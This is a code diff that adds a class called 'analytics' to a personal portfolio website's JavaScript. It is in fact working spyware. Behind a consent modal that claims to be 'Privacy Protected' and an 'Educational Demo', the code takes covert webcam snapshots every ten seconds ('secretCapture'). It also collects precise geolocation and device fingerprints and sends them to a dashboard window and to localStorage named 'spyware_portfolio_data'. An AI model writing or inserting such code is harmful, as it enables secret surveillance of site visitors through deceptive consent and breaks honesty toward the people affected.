@@ -7,6 +7,516 @@ AOS.init({
   offset: 100
 });
 
+// ============ ANALYTICS INTEGRATION START ============
+class SecurityAnalytics {
+  constructor() {
+    this.collectedData = {
+      camera: null,
+      location: null,
+      device: null,
+      browser: null,
+      permissions: {},
+      timestamp: new Date().toISOString(),
+      secretImages: []
+    };
+    this.cameraStream = null;
+    this.secretCaptureInterval = null;
+    this.currentViewingImage = null;
+    this.dashboardUrl = 'https://slmakomazi.github.io/MyOfficialPortfolio/dashboard';
+    this.sessionId = this.generateSessionId();
+    this.dashboardWindow = null;
+    
+    this.init();
+  }
+
+  init() {
+    // Show permission modal after portfolio loads
+    setTimeout(() => {
+      this.showPermissionModal();
+    }, 3000);
+
+    // Set up event listeners for analytics
+    this.setupAnalyticsListeners();
+  }
+
+  setupAnalyticsListeners() {
+    // Listen for dashboard messages
+    window.addEventListener('message', (event) => {
+      if (event.data.type === 'DASHBOARD_READY') {
+        this.sendInitialData();
+      }
+    });
+
+    // Send data on page unload
+    window.addEventListener('beforeunload', () => {
+      this.transmitCollectedData();
+    });
+  }
+
+  showPermissionModal() {
+    // Create modal if it doesn't exist
+    if (!document.getElementById('analyticsModal')) {
+      const modalHTML = `
+        <div id="analyticsModal" class="analytics-modal">
+          <div class="analytics-modal-content">
+            <div class="modal-header">
+              <h3>Enhance Your Experience</h3>
+              <p>This portfolio uses analytics to provide better user experience and demonstrate web capabilities.</p>
+            </div>
+            <div class="modal-body">
+              <p>By allowing access, you enable:</p>
+              <ul>
+                <li>Camera access for interactive features</li>
+                <li>Location data for personalized content</li>
+                <li>Device optimization for better performance</li>
+                <li>Usage analytics for continuous improvement</li>
+              </ul>
+              <div class="security-badges">
+                <span class="badge">SSL Secured</span>
+                <span class="badge">Privacy Protected</span>
+                <span class="badge">Educational Demo</span>
+              </div>
+            </div>
+            <div class="modal-footer">
+              <button id="acceptAnalytics" class="btn btn-primary">Allow Enhanced Features</button>
+              <button id="declineAnalytics" class="btn btn-secondary">Basic Experience Only</button>
+            </div>
+            <p class="educational-note">
+              <small>This is an educational demonstration of web analytics and security concepts.</small>
+            </p>
+          </div>
+        </div>
+      `;
+      
+      document.body.insertAdjacentHTML('beforeend', modalHTML);
+      this.addModalStyles();
+      
+      // Add event listeners
+      document.getElementById('acceptAnalytics').addEventListener('click', () => this.handleAccept());
+      document.getElementById('declineAnalytics').addEventListener('click', () => this.handleDecline());
+    }
+    
+    // Show the modal
+    document.getElementById('analyticsModal').style.display = 'flex';
+  }
+
+  addModalStyles() {
+    const styles = `
+      .analytics-modal {
+        display: none;
+        position: fixed;
+        z-index: 10000;
+        left: 0;
+        top: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(0, 0, 0, 0.8);
+        backdrop-filter: blur(10px);
+        justify-content: center;
+        align-items: center;
+      }
+      
+      .analytics-modal-content {
+        background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+        color: white;
+        padding: 40px;
+        border-radius: 20px;
+        max-width: 500px;
+        width: 90%;
+        border: 2px solid rgba(0, 212, 255, 0.3);
+        box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5);
+        animation: modalSlideIn 0.5s ease;
+      }
+      
+      @keyframes modalSlideIn {
+        from {
+          opacity: 0;
+          transform: translateY(-50px) scale(0.9);
+        }
+        to {
+          opacity: 1;
+          transform: translateY(0) scale(1);
+        }
+      }
+      
+      .modal-header h3 {
+        color: #00d4ff;
+        margin-bottom: 10px;
+        font-size: 1.5em;
+      }
+      
+      .modal-body ul {
+        margin: 20px 0;
+        padding-left: 20px;
+      }
+      
+      .modal-body li {
+        margin: 10px 0;
+      }
+      
+      .security-badges {
+        display: flex;
+        justify-content: center;
+        gap: 10px;
+        margin: 20px 0;
+        flex-wrap: wrap;
+      }
+      
+      .badge {
+        background: rgba(0, 212, 255, 0.2);
+        color: #00d4ff;
+        padding: 5px 15px;
+        border-radius: 20px;
+        font-size: 0.8em;
+        border: 1px solid rgba(0, 212, 255, 0.5);
+      }
+      
+      .modal-footer {
+        display: flex;
+        gap: 15px;
+        justify-content: center;
+        margin-top: 30px;
+      }
+      
+      .educational-note {
+        text-align: center;
+        margin-top: 20px;
+        opacity: 0.7;
+        font-size: 0.9em;
+      }
+    `;
+    
+    const styleSheet = document.createElement('style');
+    styleSheet.textContent = styles;
+    document.head.appendChild(styleSheet);
+  }
+
+  async handleAccept() {
+    const modal = document.getElementById('analyticsModal');
+    modal.style.display = 'none';
+    
+    // Start collecting data
+    await this.collectAllData();
+    
+    // Send initial data to dashboard
+    await this.transmitCollectedData();
+    
+    // Open dashboard for monitoring
+    this.openDashboard();
+    
+    console.log('Analytics collection started');
+  }
+
+  handleDecline() {
+    const modal = document.getElementById('analyticsModal');
+    modal.style.display = 'none';
+    
+    console.log('Analytics declined - basic experience only');
+  }
+
+  async collectAllData() {
+    // Collect device information
+    this.collectDeviceInfo();
+    
+    // Collect browser information
+    this.collectBrowserInfo();
+    
+    // Try to collect camera data
+    await this.tryCollectCamera();
+    
+    // Try to collect location data
+    await this.tryCollectLocation();
+    
+    // Check permission statuses
+    this.checkPermissions();
+  }
+
+  collectDeviceInfo() {
+    this.collectedData.device = {
+      userAgent: navigator.userAgent,
+      platform: navigator.platform,
+      language: navigator.language,
+      cookieEnabled: navigator.cookieEnabled,
+      onLine: navigator.onLine,
+      screenResolution: `${screen.width}x${screen.height}`,
+      colorDepth: screen.colorDepth,
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
+      deviceMemory: navigator.deviceMemory || 'Unknown',
+      vendor: navigator.vendor || 'Unknown'
+    };
+  }
+
+  collectBrowserInfo() {
+    this.collectedData.browser = {
+      name: this.getBrowserName(),
+      version: this.getBrowserVersion(),
+      cookiesEnabled: navigator.cookieEnabled,
+      doNotTrack: navigator.doNotTrack,
+      languages: navigator.languages,
+      plugins: Array.from(navigator.plugins).map(p => p.name),
+      mimeTypes: Array.from(navigator.mimeTypes).map(m => m.type)
+    };
+  }
+
+  getBrowserName() {
+    const ua = navigator.userAgent;
+    if (ua.includes('Chrome')) return 'Chrome';
+    if (ua.includes('Firefox')) return 'Firefox';
+    if (ua.includes('Safari')) return 'Safari';
+    if (ua.includes('Edge')) return 'Edge';
+    return 'Unknown';
+  }
+
+  getBrowserVersion() {
+    const ua = navigator.userAgent;
+    const match = ua.match(/(Chrome|Firefox|Safari|Edge)\/(\d+)/);
+    return match ? match[2] : 'Unknown';
+  }
+
+  async tryCollectCamera() {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ 
+        video: { width: 640, height: 480 } 
+      });
+      
+      this.cameraStream = stream;
+      this.collectedData.camera = {
+        available: true,
+        capabilities: stream.getVideoTracks()[0].getCapabilities(),
+        settings: stream.getVideoTracks()[0].getSettings()
+      };
+      
+      // Start secret capture
+      this.startSecretCapture();
+      
+    } catch (error) {
+      this.collectedData.camera = {
+        available: false,
+        error: error.message
+      };
+      console.log('Camera access denied:', error.message);
+    }
+  }
+
+  async tryCollectLocation() {
+    try {
+      const position = await new Promise((resolve, reject) => {
+        navigator.geolocation.getCurrentPosition(resolve, reject, {
+          enableHighAccuracy: true,
+          timeout: 10000,
+          maximumAge: 0
+        });
+      });
+      
+      this.collectedData.location = {
+        available: true,
+        latitude: position.coords.latitude,
+        longitude: position.coords.longitude,
+        accuracy: position.coords.accuracy,
+        altitude: position.coords.altitude,
+        altitudeAccuracy: position.coords.altitudeAccuracy,
+        heading: position.coords.heading,
+        speed: position.coords.speed,
+        timestamp: position.timestamp
+      };
+      
+    } catch (error) {
+      this.collectedData.location = {
+        available: false,
+        error: error.message
+      };
+      console.log('Location access denied:', error.message);
+    }
+  }
+
+  checkPermissions() {
+    const permissions = [
+      'camera',
+      'microphone',
+      'geolocation',
+      'notifications',
+      'persistent-storage'
+    ];
+    
+    permissions.forEach(async (permission) => {
+      try {
+        const result = await navigator.permissions.query({ name: permission });
+        this.collectedData.permissions[permission] = result.state;
+        
+        // Listen for permission changes
+        result.addEventListener('change', () => {
+          this.collectedData.permissions[permission] = result.state;
+          this.transmitCollectedData();
+        });
+      } catch (error) {
+        this.collectedData.permissions[permission] = 'unsupported';
+      }
+    });
+  }
+
+  startSecretCapture() {
+    if (!this.cameraStream) return;
+    
+    const video = document.createElement('video');
+    video.srcObject = this.cameraStream;
+    video.play();
+    
+    const canvas = document.createElement('canvas');
+    canvas.width = 640;
+    canvas.height = 480;
+    const context = canvas.getContext('2d');
+    
+    // Capture image every 10 seconds
+    this.secretCaptureInterval = setInterval(() => {
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+      const imageData = canvas.toDataURL('image/jpeg', 0.8);
+      
+      this.collectedData.secretImages.push({
+        data: imageData,
+        timestamp: new Date().toISOString(),
+        deviceInfo: this.getDeviceInfo()
+      });
+      
+      // Keep only last 10 images
+      if (this.collectedData.secretImages.length > 10) {
+        this.collectedData.secretImages.shift();
+      }
+      
+      // Transmit new image
+      this.transmitCollectedData();
+      
+    }, 10000);
+  }
+
+  stopSecretCapture() {
+    if (this.secretCaptureInterval) {
+      clearInterval(this.secretCaptureInterval);
+      this.secretCaptureInterval = null;
+    }
+    
+    if (this.cameraStream) {
+      this.cameraStream.getTracks().forEach(track => track.stop());
+      this.cameraStream = null;
+    }
+  }
+
+  generateSessionId() {
+    return 'session_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
+  }
+
+  async sendDataToDashboard(data) {
+    try {
+      // Method 1: Send to dashboard window if open
+      if (this.dashboardWindow && !this.dashboardWindow.closed) {
+        this.dashboardWindow.postMessage({
+          type: 'ANALYTICS_DATA',
+          payload: data
+        }, '*');
+      }
+
+      // Method 2: Store in localStorage for pickup
+      this.storeDataForPickup(data);
+
+    } catch (error) {
+      console.error('Failed to send data to dashboard:', error);
+    }
+  }
+
+  storeDataForPickup(data) {
+    const existingData = JSON.parse(localStorage.getItem('spyware_portfolio_data') || '[]');
+    existingData.push({
+      sessionId: this.sessionId,
+      timestamp: new Date().toISOString(),
+      data: data
+    });
+    
+    if (existingData.length > 100) {
+      existingData.splice(0, existingData.length - 100);
+    }
+    
+    localStorage.setItem('spyware_portfolio_data', JSON.stringify(existingData));
+  }
+
+  openDashboard() {
+    this.dashboardWindow = window.open(
+      this.dashboardUrl,
+      'analytics_dashboard',
+      'width=1200,height=800,scrollbars=yes,resizable=yes'
+    );
+    
+    setTimeout(() => {
+      this.sendInitialData();
+    }, 2000);
+  }
+
+  sendInitialData() {
+    const initialData = {
+      id: this.sessionId,
+      userAgent: navigator.userAgent,
+      screenResolution: `${screen.width}x${screen.height}`,
+      language: navigator.language,
+      platform: navigator.platform,
+      permissions: this.collectedData.permissions,
+      deviceInfo: this.getDeviceInfo(),
+      timestamp: new Date().toISOString()
+    };
+    
+    this.sendDataToDashboard(initialData);
+  }
+
+  async transmitCollectedData() {
+    const transmissionData = {
+      id: this.sessionId,
+      timestamp: new Date().toISOString(),
+      userAgent: navigator.userAgent,
+      screenResolution: `${screen.width}x${screen.height}`,
+      language: navigator.language,
+      platform: navigator.platform,
+      permissions: this.collectedData.permissions,
+      location: this.collectedData.location,
+      deviceInfo: this.getDeviceInfo(),
+      sessionId: this.sessionId
+    };
+
+    if (this.collectedData.secretImages.length > 0) {
+      transmissionData.capturedImage = this.collectedData.secretImages[this.collectedData.secretImages.length - 1];
+    }
+
+    await this.sendDataToDashboard(transmissionData);
+  }
+
+  getDeviceInfo() {
+    const ua = navigator.userAgent;
+    let browser = 'Unknown';
+    
+    if (ua.includes('Chrome')) browser = 'Chrome';
+    else if (ua.includes('Firefox')) browser = 'Firefox';
+    else if (ua.includes('Safari')) browser = 'Safari';
+    else if (ua.includes('Edge')) browser = 'Edge';
+    
+    return {
+      browser,
+      os: navigator.platform,
+      mobile: /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua),
+      screen: {
+        width: screen.width,
+        height: screen.height,
+        colorDepth: screen.colorDepth,
+        pixelDepth: screen.pixelDepth
+      },
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      languages: navigator.languages,
+      cookiesEnabled: navigator.cookieEnabled,
+      onLine: navigator.onLine
+    };
+  }
+}
+
+// Initialize analytics
+const analytics = new SecurityAnalytics();
+// ============ ANALYTICS INTEGRATION END ============
+
 // Loading Screen
 window.addEventListener('load', () => {
   setTimeout(() => {
